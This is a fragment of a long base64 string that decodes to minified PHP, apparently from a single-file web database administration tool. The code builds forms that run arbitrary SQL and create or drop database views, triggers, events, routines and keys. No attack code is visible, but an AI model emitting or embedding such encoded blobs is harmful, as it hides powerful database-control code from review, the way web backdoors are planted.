Zl9lc2NhcGUoJG9bImZpZWxkIl0pLiIgQVMgIi5pZGZfZXNjYXBlKCRvWyJmaWVsZCJdKTtpZighJG9bImlub3V0Il18fHN1YnN0cigkb1siaW5vdXQiXSwwLDIpPT0iSU4iKSRsZFtdPSRzO31pZighJG4mJiRfUE9TVCl7JFhhPWFycmF5KCk7Zm9yZWFjaCgkZWdbImZpZWxkcyJdYXMkeD0+JG8pe2lmKGluX2FycmF5KCR4LCRsZCkpeyRYPXByb2Nlc3NfaW5wdXQoJG8pO2lmKCRYPT09ZmFsc2UpJFg9IicnIjtpZihpc3NldCgkY2ZbJHhdKSkkZy0+cXVlcnkoIlNFVCBAIi5pZGZfZXNjYXBlKCRvWyJmaWVsZCJdKS4iID0gJFgiKTt9JFhhW109KGlzc2V0KCRjZlskeF0pPyJAIi5pZGZfZXNjYXBlKCRvWyJmaWVsZCJdKTokWCk7fSRIPShpc3NldCgkX0dFVFsiY2FsbGYiXSk/IlNFTEVDVCI6IkNBTEwiKS4iICIuaWRmX2VzY2FwZSgkZGEpLiIoIi5pbXBsb2RlKCIsICIsJFhhKS4iKSI7ZWNobyI8cD48Y29kZSBjbGFzcz0nanVzaC0kdyc+Ii5oKCRIKS4iPC9jb2RlPiA8YSBocmVmPSciLmgoTUUpLiJzcWw9Ii51cmxlbmNvZGUoJEgpLiInPiIuJ0VkaXQnLiI8L2E+XG4iO2lmKCEkZy0+bXVsdGlfcXVlcnkoJEgpKWVjaG8iPHAgY2xhc3M9J2Vycm9yJz4iLmVycm9yKCkuIlxuIjtlbHNleyRoPWNvbm5lY3QoKTtpZihpc19vYmplY3QoJGgpKSRoLT5zZWxlY3RfZGIoREIpO2RveyRJPSRnLT5zdG9yZV9yZXN1bHQoKTtpZihpc19vYmplY3QoJEkpKXNlbGVjdCgkSSwkaCk7ZWxzZQ0KZWNobyI8cCBjbGFzcz0nbWVzc2FnZSc+Ii5sYW5nKGFycmF5KCdSb3V0aW5lIGhhcyBiZWVuIGNhbGxlZCwgJWQgcm93IGFmZmVjdGVkLicsJ1JvdXRpbmUgaGFzIGJlZW4gY2FsbGVkLCAlZCByb3dzIGFmZmVjdGVkLicpLCRnLT5hZmZlY3RlZF9yb3dzKS4iXG4iO313aGlsZSgkZy0+bmV4dF9yZXN1bHQoKSk7aWYoJGNmKXNlbGVjdCgkZy0+cXVlcnkoIlNFTEVDVCAiLmltcGxvZGUoIiwgIiwkY2YpKSk7fX1lY2hvJw0KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQonO2lmKCRsZCl7ZWNobyI8dGFibGUgY2VsbHNwYWNpbmc9JzAnPlxuIjtmb3JlYWNoKCRsZA0KYXMkeCl7JG89JGVnWyJmaWVsZHMiXVskeF07JEM9JG9bImZpZWxkIl07ZWNobyI8dHI+PHRoPiIuJGItPmZpZWxkTmFtZSgkbyk7JFk9JF9QT1NUWyJmaWVsZHMiXVskQ107aWYoJFkhPSIiKXtpZigkb1sidHlwZSJdPT0iZW51bSIpJFk9KyRZO2lmKCRvWyJ0eXBlIl09PSJzZXQiKSRZPWFycmF5X3N1bSgkWSk7fWlucHV0KCRvLCRZLChzdHJpbmcpJF9QT1NUWyJmdW5jdGlvbiJdWyRDXSk7ZWNobyJcbiI7fWVjaG8iPC90YWJsZT5cbiI7fWVjaG8nPHA+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ2FsbCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9IicsJFQsJyI+DQo8L2Zvcm0+DQonO31lbHNlaWYoaXNzZXQoJF9HRVRbImZvcmVpZ24iXSkpeyRhPSRfR0VUWyJmb3JlaWduIl07JEM9JF9HRVRbIm5hbWUiXTskSz0kX1BPU1Q7aWYoJF9QT1NUJiYhJG4mJiEkX1BPU1RbImFkZCJdJiYhJF9QT1NUWyJjaGFuZ2UiXSYmISRfUE9TVFsiY2hhbmdlLWpzIl0peyRpZT0oJF9QT1NUWyJkcm9wIl0/J0ZvcmVpZ24ga2V5IGhhcyBiZWVuIGRyb3BwZWQuJzooJEMhPSIiPydGb3JlaWduIGtleSBoYXMgYmVlbiBhbHRlcmVkLic6J0ZvcmVpZ24ga2V5IGhhcyBiZWVuIGNyZWF0ZWQuJykpOyRBPU1FLiJ0YWJsZT0iLnVybGVuY29kZSgkYSk7JEtbInNvdXJjZSJdPWFycmF5X2ZpbHRlcigkS1sic291cmNlIl0sJ3N0cmxlbicpO2tzb3J0KCRLWyJzb3VyY2UiXSk7JFlnPWFycmF5KCk7Zm9yZWFjaCgkS1sic291cmNlIl1hcyR4PT4kWCkkWWdbJHhdPSRLWyJ0YXJnZXQiXVskeF07JEtbInRhcmdldCJdPSRZZztpZigkdz09InNxbGl0ZSIpcXVlcmllc19yZWRpcmVjdCgkQSwkaWUscmVjcmVhdGVfdGFibGUoJGEsJGEsYXJyYXkoKSxhcnJheSgpLGFycmF5KCIgJEMiPT4oJF9QT1NUWyJkcm9wIl0/IiI6IiAiLmZvcm1hdF9mb3JlaWduX2tleSgkSykpKSkpO2Vsc2V7JGM9IkFMVEVSIFRBQkxFICIudGFibGUoJGEpOyRXYj0iXG5EUk9QICIuKCR3PT0ic3FsIj8iRk9SRUlHTiBLRVkgIjoiQ09OU1RSQUlOVCAiKS5pZGZfZXNjYXBlKCRDKTtpZigkX1BPU1RbImRyb3AiXSlxdWVyeV9yZWRpcmVjdCgkYy4kV2IsJEEsJGllKTtlbHNle3F1ZXJ5X3JlZGlyZWN0KCRjLigkQyE9IiI/IiRXYiwiOiIiKS4iXG5BREQiLmZvcm1hdF9mb3JlaWduX2tleSgkSyksJEEsJGllKTskbj0nU291cmNlIGFuZCB0YXJnZXQgY29sdW1ucyBtdXN0IGhhdmUgdGhlIHNhbWUgZGF0YSB0eXBlLCB0aGVyZSBtdXN0IGJlIGFuIGluZGV4IG9uIHRoZSB0YXJnZXQgY29sdW1ucyBhbmQgcmVmZXJlbmNlZCBkYXRhIG11c3QgZXhpc3QuJy4iPGJyPiRuIjt9fX1wYWdlX2hlYWRlcignRm9yZWlnbiBrZXknLCRuLGFycmF5KCJ0YWJsZSI9PiRhKSxoKCRhKSk7aWYoJF9QT1NUKXtrc29ydCgkS1sic291cmNlIl0pO2lmKCRfUE9TVFsiYWRkIl0pJEtbInNvdXJjZSJdW109IiI7ZWxzZWlmKCRfUE9TVFsiY2hhbmdlIl18fCRfUE9TVFsiY2hhbmdlLWpzIl0pJEtbInRhcmdldCJdPWFycmF5KCk7fWVsc2VpZigkQyE9IiIpeyRNYz1mb3JlaWduX2tleXMoJGEpOyRLPSRNY1skQ107JEtbInNvdXJjZSJdW109IiI7fWVsc2V7JEtbInRhYmxlIl09JGE7JEtbInNvdXJjZSJdPWFycmF5KCIiKTt9JEFnPWFycmF5X2tleXMoZmllbGRzKCRhKSk7JFlnPSgkYT09PSRLWyJ0YWJsZSJdPyRBZzphcnJheV9rZXlzKGZpZWxkcygkS1sidGFibGUiXSkpKTskUWY9YXJyYXlfa2V5cyhhcnJheV9maWx0ZXIodGFibGVfc3RhdHVzKCcnLHRydWUpLCdma19zdXBwb3J0JykpO2VjaG8nDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCjxwPg0KJztpZigkS1siZGIiXT09IiImJiRLWyJucyJdPT0iIil7ZWNobydUYXJnZXQgdGFibGU6DQonLGh0bWxfc2VsZWN0KCJ0YWJsZSIsJFFmLCRLWyJ0YWJsZSJdLCJ0aGlzLmZvcm1bJ2NoYW5nZS1qcyddLnZhbHVlID0gJzEnOyB0aGlzLmZvcm0uc3VibWl0KCk7IiksJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNoYW5nZS1qcyIgdmFsdWU9IiI+DQo8bm9zY3JpcHQ+PHA+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iY2hhbmdlIiB2YWx1ZT0iQ2hhbmdlIj48L25vc2NyaXB0Pg0KPHRhYmxlIGNlbGxzcGFjaW5nPSIwIj4NCjx0aGVhZD48dHI+PHRoPlNvdXJjZTx0aD5UYXJnZXQ8L3RoZWFkPg0KJzskRGQ9MDtmb3JlYWNoKCRLWyJzb3VyY2UiXWFzJHg9PiRYKXtlY2hvIjx0cj4iLCI8dGQ+Ii5odG1sX3NlbGVjdCgic291cmNlWyIuKCskeCkuIl0iLGFycmF5KC0xPT4iIikrJEFnLCRYLCgkRGQ9PWNvdW50KCRLWyJzb3VyY2UiXSktMT8iZm9yZWlnbkFkZFJvdyh0aGlzKTsiOjEpKSwiPHRkPiIuaHRtbF9zZWxlY3QoInRhcmdldFsiLigrJHgpLiJdIiwkWWcsJEtbInRhcmdldCJdWyR4XSk7JERkKys7fWVjaG8nPC90YWJsZT4NCjxwPg0KT04gREVMRVRFOiAnLGh0bWxfc2VsZWN0KCJvbl9kZWxldGUiLGFycmF5KC0xPT4iIikrZXhwbG9kZSgifCIsJEplKSwkS1sib25fZGVsZXRlIl0pLCcgT04gVVBEQVRFOiAnLGh0bWxfc2VsZWN0KCJvbl91cGRhdGUiLGFycmF5KC0xPT4iIikrZXhwbG9kZSgifCIsJEplKSwkS1sib25fdXBkYXRlIl0pLGRvY19saW5rKGFycmF5KCdzcWwnPT4iaW5ub2RiLWZvcmVpZ24ta2V5LWNvbnN0cmFpbnRzLmh0bWwiLCdwZ3NxbCc9PiJzcWwtY3JlYXRldGFibGUuaHRtbCNTUUwtQ1JFQVRFVEFCTEUtUkVGRVJFTkNFUyIsJ21zc3FsJz0+Im1zMTc0OTc5LmFzcHgiLCdvcmFjbGUnPT4iY2xhdXNlczAwMi5odG0jc3RocmVmMjkwMyIsKSksJzxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPg0KPG5vc2NyaXB0PjxwPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImFkZCIgdmFsdWU9IkFkZCBjb2x1bW4iPjwvbm9zY3JpcHQ+DQonO31pZigkQyE9IiIpe2VjaG8nPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZHJvcCIgdmFsdWU9IkRyb3AiJyxjb25maXJtKCksJz4nO31lY2hvJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iJywkVCwnIj4NCjwvZm9ybT4NCic7fWVsc2VpZihpc3NldCgkX0dFVFsidmlldyJdKSl7JGE9JF9HRVRbInZpZXciXTskSz0kX1BPU1Q7aWYoJF9QT1NUJiYhJG4peyRDPXRyaW0oJEtbIm5hbWUiXSk7JEZhPSIgQVNcbiRLW3NlbGVjdF0iOyRBPU1FLiJ0YWJsZT0iLnVybGVuY29kZSgkQyk7JGllPSdWaWV3IGhhcyBiZWVuIGFsdGVyZWQuJztpZigkX0dFVFsibWF0ZXJpYWxpemVkIl0pJFU9Ik1BVEVSSUFMSVpFRCBWSUVXIjtlbHNleyRVPSJWSUVXIjtpZigkdz09InBnc3FsIil7JEZnPXRhYmxlX3N0YXR1cygkQyk7JFU9KCRGZz9zdHJ0b3VwcGVyKCRGZ1siRW5naW5lIl0pOiRVKTt9fWlmKCEkX1BPU1RbImRyb3AiXSYmJGE9PSRDJiYkdyE9InNxbGl0ZSImJiRVIT0iTUFURVJJQUxJWkVEIFZJRVciKXF1ZXJ5X3JlZGlyZWN0KCgkdz09Im1zc3FsIj8iQUxURVIiOiJDUkVBVEUgT1IgUkVQTEFDRSIpLiIgVklFVyAiLnRhYmxlKCRDKS4kRmEsJEEsJGllKTtlbHNleyRhaD0kQy4iX2FkbWluZXJfIi51bmlxaWQoKTtkcm9wX2NyZWF0ZSgiRFJPUCAkVSAiLnRhYmxlKCRhKSwiQ1JFQVRFICRVICIudGFibGUoJEMpLiRGYSwiRFJPUCAkVSAiLnRhYmxlKCRDKSwiQ1JFQVRFICRVICIudGFibGUoJGFoKS4kRmEsIkRST1AgJFUgIi50YWJsZSgkYWgpLCgkX1BPU1RbImRyb3AiXT9zdWJzdHIoTUUsMCwtMSk6JEEpLCdWaWV3IGhhcyBiZWVuIGRyb3BwZWQuJywkaWUsJ1ZpZXcgaGFzIGJlZW4gY3JlYXRlZC4nLCRhLCRDKTt9fWlmKCEkX1BPU1QmJiRhIT0iIil7JEs9dmlldygkYSk7JEtbIm5hbWUiXT0kYTtpZighJG4pJG49ZXJyb3IoKTt9cGFnZV9oZWFkZXIoKCRhIT0iIj8nQWx0ZXIgdmlldyc6J0NyZWF0ZSB2aWV3JyksJG4sYXJyYXkoInRhYmxlIj0+JGEpLGgoJGEpKTtlY2hvJw0KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQo8cD5OYW1lOiA8aW5wdXQgbmFtZT0ibmFtZSIgdmFsdWU9IicsaCgkS1sibmFtZSJdKSwnIiBtYXhsZW5ndGg9IjY0IiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIj4NCjxwPic7dGV4dGFyZWEoInNlbGVjdCIsJEtbInNlbGVjdCJdKTtlY2hvJzxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPg0KJztpZigkX0dFVFsidmlldyJdIT0iIil7ZWNobyc8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJkcm9wIiB2YWx1ZT0iRHJvcCInLGNvbmZpcm0oKSwnPic7fWVjaG8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSInLCRULCciPg0KPC9mb3JtPg0KJzt9ZWxzZWlmKGlzc2V0KCRfR0VUWyJldmVudCJdKSl7JGFhPSRfR0VUWyJldmVudCJdOyR2ZD1hcnJheSgiWUVBUiIsIlFVQVJURVIiLCJNT05USCIsIkRBWSIsIkhPVVIiLCJNSU5VVEUiLCJXRUVLIiwiU0VDT05EIiwiWUVBUl9NT05USCIsIkRBWV9IT1VSIiwiREFZX01JTlVURSIsIkRBWV9TRUNPTkQiLCJIT1VSX01JTlVURSIsIkhPVVJfU0VDT05EIiwiTUlOVVRFX1NFQ09ORCIpOyRHZz1hcnJheSgiRU5BQkxFRCI9PiJFTkFCTEUiLCJESVNBQkxFRCI9PiJESVNBQkxFIiwiU0xBVkVTSURFX0RJU0FCTEVEIj0+IkRJU0FCTEUgT04gU0xBVkUiKTskSz0kX1BPU1Q7aWYoJF9QT1NUJiYhJG4pe2lmKCRfUE9TVFsiZHJvcCJdKXF1ZXJ5X3JlZGlyZWN0KCJEUk9QIEVWRU5UICIuaWRmX2VzY2FwZSgkYWEpLHN1YnN0cihNRSwwLC0xKSwnRXZlbnQgaGFzIGJlZW4gZHJvcHBlZC4nKTtlbHNlaWYoaW5fYXJyYXkoJEtbIklOVEVSVkFMX0ZJRUxEIl0sJHZkKSYmaXNzZXQoJEdnWyRLWyJTVEFUVVMiXV0pKXskamc9IlxuT04gU0NIRURVTEUgIi4oJEtbIklOVEVSVkFMX1ZBTFVFIl0/IkVWRVJZICIucSgkS1siSU5URVJWQUxfVkFMVUUiXSkuIiAkS1tJTlRFUlZBTF9GSUVMRF0iLigkS1siU1RBUlRTIl0/IiBTVEFSVFMgIi5xKCRLWyJTVEFSVFMiXSk6IiIpLigkS1siRU5EUyJdPyIgRU5EUyAiLnEoJEtbIkVORFMiXSk6IiIpOiJBVCAiLnEoJEtbIlNUQVJUUyJdKSkuIiBPTiBDT01QTEVUSU9OIi4oJEtbIk9OX0NPTVBMRVRJT04iXT8iIjoiIE5PVCIpLiIgUFJFU0VSVkUiO3F1ZXJpZXNfcmVkaXJlY3Qoc3Vic3RyKE1FLDAsLTEpLCgkYWEhPSIiPydFdmVudCBoYXMgYmVlbiBhbHRlcmVkLic6J0V2ZW50IGhhcyBiZWVuIGNyZWF0ZWQuJykscXVlcmllcygoJGFhIT0iIj8iQUxURVIgRVZFTlQgIi5pZGZfZXNjYXBlKCRhYSkuJGpnLigkYWEhPSRLWyJFVkVOVF9OQU1FIl0/IlxuUkVOQU1FIFRPICIuaWRmX2VzY2FwZSgkS1siRVZFTlRfTkFNRSJdKToiIik6IkNSRUFURSBFVkVOVCAiLmlkZl9lc2NhcGUoJEtbIkVWRU5UX05BTUUiXSkuJGpnKS4iXG4iLiRHZ1skS1siU1RBVFVTIl1dLiIgQ09NTUVOVCAiLnEoJEtbIkVWRU5UX0NPTU1FTlQiXSkucnRyaW0oIiBET1xuJEtbRVZFTlRfREVGSU5JVElPTl0iLCI7IikuIjsiKSk7fX1wYWdlX2hlYWRlcigoJGFhIT0iIj8nQWx0ZXIgZXZlbnQnLiI6ICIuaCgkYWEpOidDcmVhdGUgZXZlbnQnKSwkbik7aWYoISRLJiYkYWEhPSIiKXskTD1nZXRfcm93cygiU0VMRUNUICogRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuRVZFTlRTIFdIRVJFIEVWRU5UX1NDSEVNQSA9ICIucShEQikuIiBBTkQgRVZFTlRfTkFNRSA9ICIucSgkYWEpKTskSz1yZXNldCgkTCk7fWVjaG8nDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCjx0YWJsZSBjZWxsc3BhY2luZz0iMCI+DQo8dHI+PHRoPk5hbWU8dGQ+PGlucHV0IG5hbWU9IkVWRU5UX05BTUUiIHZhbHVlPSInLGgoJEtbIkVWRU5UX05BTUUiXSksJyIgbWF4bGVuZ3RoPSI2NCIgYXV0b2NhcGl0YWxpemU9Im9mZiI+DQo8dHI+PHRoIHRpdGxlPSJkYXRldGltZSI+U3RhcnQ8dGQ+PGlucHV0IG5hbWU9IlNUQVJUUyIgdmFsdWU9IicsaCgiJEtbRVhFQ1VURV9BVF0kS1tTVEFSVFNdIiksJyI+DQo8dHI+PHRoIHRpdGxlPSJkYXRldGltZSI+RW5kPHRkPjxpbnB1dCBuYW1lPSJFTkRTIiB2YWx1ZT0iJyxoKCRLWyJFTkRTIl0pLCciPg0KPHRyPjx0aD5FdmVyeTx0ZD48aW5wdXQgdHlwZT0ibnVtYmVyIiBuYW1lPSJJTlRFUlZBTF9WQUxVRSIgdmFsdWU9IicsaCgkS1siSU5URVJWQUxfVkFMVUUiXSksJyIgY2xhc3M9InNpemUiPiAnLGh0bWxfc2VsZWN0KCJJTlRFUlZBTF9GSUVMRCIsJHZkLCRLWyJJTlRFUlZBTF9GSUVMRCJdKSwnPHRyPjx0aD5TdGF0dXM8dGQ+JyxodG1sX3NlbGVjdCgiU1RBVFVTIiwkR2csJEtbIlNUQVRVUyJdKSwnPHRyPjx0aD5Db21tZW50PHRkPjxpbnB1dCBuYW1lPSJFVkVOVF9DT01NRU5UIiB2YWx1ZT0iJyxoKCRLWyJFVkVOVF9DT01NRU5UIl0pLCciIG1heGxlbmd0aD0iNjQiPg0KPHRyPjx0aD4mbmJzcDs8dGQ+JyxjaGVja2JveCgiT05fQ09NUExFVElPTiIsIlBSRVNFUlZFIiwkS1siT05fQ09NUExFVElPTiJdPT0iUFJFU0VSVkUiLCdPbiBjb21wbGV0aW9uIHByZXNlcnZlJyksJzwvdGFibGU+DQo8cD4nO3RleHRhcmVhKCJFVkVOVF9ERUZJTklUSU9OIiwkS1siRVZFTlRfREVGSU5JVElPTiJdKTtlY2hvJzxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPg0KJztpZigkYWEhPSIiKXtlY2hvJzxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImRyb3AiIHZhbHVlPSJEcm9wIicsY29uZmlybSgpLCc+Jzt9ZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9IicsJFQsJyI+DQo8L2Zvcm0+DQonO31lbHNlaWYoaXNzZXQoJF9HRVRbInByb2NlZHVyZSJdKSl7JGRhPSRfR0VUWyJwcm9jZWR1cmUiXTskZWc9KGlzc2V0KCRfR0VUWyJmdW5jdGlvbiJdKT8iRlVOQ1RJT04iOiJQUk9DRURVUkUiKTskSz0kX1BPU1Q7JEtbImZpZWxkcyJdPShhcnJheSkkS1siZmllbGRzIl07aWYoJF9QT1NUJiYhcHJvY2Vzc19maWVsZHMoJEtbImZpZWxkcyJdKSYmISRuKXskYWg9IiRLW25hbWVdX2FkbWluZXJfIi51bmlxaWQoKTtkcm9wX2NyZWF0ZSgiRFJPUCAkZWcgIi5pZGZfZXNjYXBlKCRkYSksY3JlYXRlX3JvdXRpbmUoJGVnLCRLKSwiRFJPUCAkZWcgIi5pZGZfZXNjYXBlKCRLWyJuYW1lIl0pLGNyZWF0ZV9yb3V0aW5lKCRlZyxhcnJheSgibmFtZSI9PiRhaCkrJEspLCJEUk9QICRlZyAiLmlkZl9lc2NhcGUoJGFoKSxzdWJzdHIoTUUsMCwtMSksJ1JvdXRpbmUgaGFzIGJlZW4gZHJvcHBlZC4nLCdSb3V0aW5lIGhhcyBiZWVuIGFsdGVyZWQuJywnUm91dGluZSBoYXMgYmVlbiBjcmVhdGVkLicsJGRhLCRLWyJuYW1lIl0pO31wYWdlX2hlYWRlcigoJGRhIT0iIj8oaXNzZXQoJF9HRVRbImZ1bmN0aW9uIl0pPydBbHRlciBmdW5jdGlvbic6J0FsdGVyIHByb2NlZHVyZScpLiI6ICIuaCgkZGEpOihpc3NldCgkX0dFVFsiZnVuY3Rpb24iXSk/J0NyZWF0ZSBmdW5jdGlvbic6J0NyZWF0ZSBwcm9jZWR1cmUnKSksJG4pO2lmKCEkX1BPU1QmJiRkYSE9IiIpeyRLPXJvdXRpbmUoJGRhLCRlZyk7JEtbIm5hbWUiXT0kZGE7fSRtYj1nZXRfdmFscygiU0hPVyBDSEFSQUNURVIgU0VUIik7c29ydCgkbWIpOyRmZz1yb3V0aW5lX2xhbmd1YWdlcygpO2VjaG8nDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBpZD0iZm9ybSI+DQo8cD5OYW1lOiA8aW5wdXQgbmFtZT0ibmFtZSIgdmFsdWU9IicsaCgkS1sibmFtZSJdKSwnIiBtYXhsZW5ndGg9IjY0IiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIj4NCicsKCRmZz8nTGFuZ3VhZ2UnLiI6ICIuaHRtbF9zZWxlY3QoImxhbmd1YWdlIiwkZmcsJEtbImxhbmd1YWdlIl0pOiIiKSwnPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiPg0KPHRhYmxlIGNlbGxzcGFjaW5nPSIwIiBjbGFzcz0ibm93cmFwIj4NCic7ZWRpdF9maWVsZHMoJEtbImZpZWxkcyJdLCRtYiwkZWcpO2lmKGlzc2V0KCRfR0VUWyJmdW5jdGlvbiJdKSl7ZWNobyI8dHI+PHRkPiIuJ1JldHVybiB0eXBlJztlZGl0X3R5cGUoInJldHVybnMiLCRLWyJyZXR1cm5zIl0sJG1iKTt9ZWNobyc8L3RhYmxlPg0KPHA+Jzt0ZXh0YXJlYSgiZGVmaW5pdGlvbiIsJEtbImRlZmluaXRpb24iXSk7ZWNobyc8cD4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTYXZlIj4NCic7aWYoJGRhIT0iIil7ZWNobyc8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJkcm9wIiB2YWx1ZT0iRHJvcCInLGNvbmZpcm0oKSwnPic7fWVjaG8nPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9rZW4iIHZhbHVlPSInLCRULCciPg0KPC9mb3JtPg0KJzt9ZWxzZWlmKGlzc2V0KCRfR0VUWyJzZXF1ZW5jZSJdKSl7JGZhPSRfR0VUWyJzZXF1ZW5jZSJdOyRLPSRfUE9TVDtpZigkX1BPU1QmJiEkbil7JF89c3Vic3RyKE1FLDAsLTEpOyRDPXRyaW0oJEtbIm5hbWUiXSk7aWYoJF9QT1NUWyJkcm9wIl0pcXVlcnlfcmVkaXJlY3QoIkRST1AgU0VRVUVOQ0UgIi5pZGZfZXNjYXBlKCRmYSksJF8sJ1NlcXVlbmNlIGhhcyBiZWVuIGRyb3BwZWQuJyk7ZWxzZWlmKCRmYT09IiIpcXVlcnlfcmVkaXJlY3QoIkNSRUFURSBTRVFVRU5DRSAiLmlkZl9lc2NhcGUoJEMpLCRfLCdTZXF1ZW5jZSBoYXMgYmVlbiBjcmVhdGVkLicpO2Vsc2VpZigkZmEhPSRDKXF1ZXJ5X3JlZGlyZWN0KCJBTFRFUiBTRVFVRU5DRSAiLmlkZl9lc2NhcGUoJGZhKS4iIFJFTkFNRSBUTyAiLmlkZl9lc2NhcGUoJEMpLCRfLCdTZXF1ZW5jZSBoYXMgYmVlbiBhbHRlcmVkLicpO2Vsc2UNCnJlZGlyZWN0KCRfKTt9cGFnZV9oZWFkZXIoJGZhIT0iIj8nQWx0ZXIgc2VxdWVuY2UnLiI6ICIuaCgkZmEpOidDcmVhdGUgc2VxdWVuY2UnLCRuKTtpZighJEspJEtbIm5hbWUiXT0kZmE7ZWNobycNCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KPHA+PGlucHV0IG5hbWU9Im5hbWUiIHZhbHVlPSInLGgoJEtbIm5hbWUiXSksJyIgYXV0b2NhcGl0YWxpemU9Im9mZiI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU2F2ZSI+DQonO2lmKCRmYSE9IiIpZWNobyI8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdkcm9wJyB2YWx1ZT0nIi4nRHJvcCcuIiciLmNvbmZpcm0oKS4iPlxuIjtlY2hvJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iJywkVCwnIj4NCjwvZm9ybT4NCic7fWVsc2VpZihpc3NldCgkX0dFVFsidHlwZSJdKSl7JGdhPSRfR0VUWyJ0eXBlIl07JEs9JF9QT1NUO2lmKCRfUE9TVCYmISRuKXskXz1zdWJzdHIoTUUsMCwtMSk7aWYoJF9QT1NUWyJkcm9wIl0pcXVlcnlfcmVkaXJlY3QoIkRST1AgVFlQRSAiLmlkZl9lc2NhcGUoJGdhKSwkXywnVHlwZSBoYXMgYmVlbiBkcm9wcGVkLicpO2Vsc2UNCnF1ZXJ5X3JlZGlyZWN0KCJDUkVBVEUgVFlQRSAiLmlkZl9lc2NhcGUodHJpbSgkS1sibmFtZSJdKSkuIiAkS1thc10iLCRfLCdUeXBlIGhhcyBiZWVuIGNyZWF0ZWQuJyk7fXBhZ2VfaGVhZGVyKCRnYSE9IiI/J0FsdGVyIHR5cGUnLiI6ICIuaCgkZ2EpOidDcmVhdGUgdHlwZScsJG4pO2lmKCEkSykkS1siYXMiXT0iQVMgIjtlY2hvJw0KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQo8cD4NCic7aWYoJGdhIT0iIillY2hvIjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2Ryb3AnIHZhbHVlPSciLidEcm9wJy4iJyIuY29uZmlybSgpLiI+XG4iO2Vsc2V7ZWNobyI8aW5wdXQgbmFtZT0nbmFtZScgdmFsdWU9JyIuaCgkS1snbmFtZSddKS4iJyBhdXRvY2FwaXRhbGl6ZT0nb2ZmJz5cbiI7dGV4dGFyZWEoImFzIiwkS1siYXMiXSk7ZWNobyI8cD48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nIi4nU2F2ZScuIic+XG4iO31lY2hvJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iJywkVCwnIj4NCjwvZm9ybT4NCic7fWVsc2VpZihpc3NldCgkX0dFVFsidHJpZ2dlciJdKSl7JGE9JF9HRVRbInRyaWdnZXIiXTskQz0kX0dFVFsibmFtZSJdOyR2aD10cmlnZ2VyX29wdGlvbnMoKTskSz0oYXJyYXkpdHJpZ2dlcigkQykrYXJyYXkoIlRyaWdnZXIiPT4kYS4iX2JpIik7aWYoJF9QT1NUKXtpZighJG4mJmluX2FycmF5KCRfUE9TVFsiVGltaW5nIl0sJHZoWyJUaW1pbmciXSkmJmluX2FycmF5KCRfUE9TVFsiRXZlbnQiXSwkdmhbIkV2ZW50Il0pJiZpbl9hcnJheSgkX1BPU1RbIlR5cGUiXSwkdmhbIlR5cGUiXSkpeyRJZT0iIE9OICIudGFibGUoJGEpOyRXYj0iRFJPUCBUUklHR0VSICIuaWRmX2VzY2FwZSgkQykuKCR3PT0icGdzcWwiPyRJZToiIik7JEE9TUUuInRhYmxlPSIudXJsZW5jb2RlKCRhKTtpZigkX1BPU1RbImRyb3AiXSlxdWVyeV9yZWRpcmVjdCgkV2IsJEEsJ1RyaWdnZXIgaGFzIGJlZW4gZHJvcHBlZC4nKTtlbHNle2lmKCRDIT0iIilxdWVyaWVzKCRXYik7cXVlcmllc19yZWRpcmVjdCgkQSwoJEMhPSIiPydUcmlnZ2VyIGhhcyBiZWVuIGFsdGVyZWQuJzonVHJpZ2dlciBoYXMgYmVlbiBjcmVhdGVkLicpLHF1ZXJpZXMoY3JlYXRlX3RyaWdnZXIoJEllLCRfUE9TVCkpKTtpZigkQyE9IiIpcXVlcmllcyhjcmVhdGVfdHJpZ2dlcigkSWUsJEsrYXJyYXkoIlR5cGUiPT5yZXNldCgkdmhbIlR5cGUiXSkpKSk7fX0kSz0kX1BPU1Q7fXBhZ2VfaGVhZGVyKCgkQyE9IiI/J0FsdGVyIHRyaWdnZXInLiI6ICIuaCgkQyk6J0NyZWF0ZSB0cmlnZ2VyJyksJG4sYXJyYXkoInRhYmxlIj0+JGEpKTtlY2hvJw0KPGZvcm0